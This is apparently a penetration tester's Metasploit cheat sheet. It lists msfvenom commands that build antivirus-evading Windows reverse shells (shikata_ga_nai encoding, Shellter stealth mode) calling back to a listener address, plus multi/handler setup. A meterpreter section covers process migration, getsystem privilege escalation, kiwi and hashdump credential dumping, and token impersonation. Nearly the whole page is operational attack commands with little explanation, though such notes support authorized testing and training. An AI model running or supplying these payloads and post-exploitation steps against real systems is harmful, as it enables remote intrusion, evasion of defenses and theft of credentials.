# Metasploit

{% embed url="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/handler" %}

{% embed url="https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/" %}

{% code overflow="wrap" %}
```
(-a x86)
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.173 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw -o shell.bin

shellter custom payload N stealth N DLL

sudo msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD windows/shell/reverse_tcp;\
set LHOST 192.168.119.173;\
set LPORT 80;\
run"

(set AutoRunScript post/windows/manage/migrate;\)
```
{% endcode %}

{% hint style="info" %}
need match payload in handler for msfvenom, use default `generic/reverse_tcp` for all other payloads eg `rev.ps1`
{% endhint %}

{% code overflow="wrap" %}
```
(-a x86)
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.173 LPORT=443 -e x86/shikata_ga_nai -i 7 -f exe -o shell.exe
```
{% endcode %}

### basic operations

{% code overflow="wrap" %}
```
meterpreter >

ps (check all process)
migrate {process id} (move current process to same priv process for better operation)
#e.g. explorer, svchost 

background (so that can start new listeners in exploit(multi/handler))
exit (!! kill the session and return to exploit(multi/handler))

upload /local/doc C:/dest/doc
download C:/dest/doc /local/doc
---------------------------------
normal shell (not meterpreter):
background
=========================

exploit(multi/handler) >

sessions -l (list sessions)
sessions -i # (go back to session #) 
-k to kill
run -j (start new listener on background)
show options
show advanced
jobs (show listener)
```
{% endcode %}

### `meterpreter >` exploit commands

```
getsystem (from medium integrity)
load kiwi
creds_msv
hashdump
(may need migrate to a valid process first)

use incognito
list_tokens -u
impersonate_token {interested user} (domain\\xx = domain\xx)
getuid
drop_token

load powershell
help powershell
```
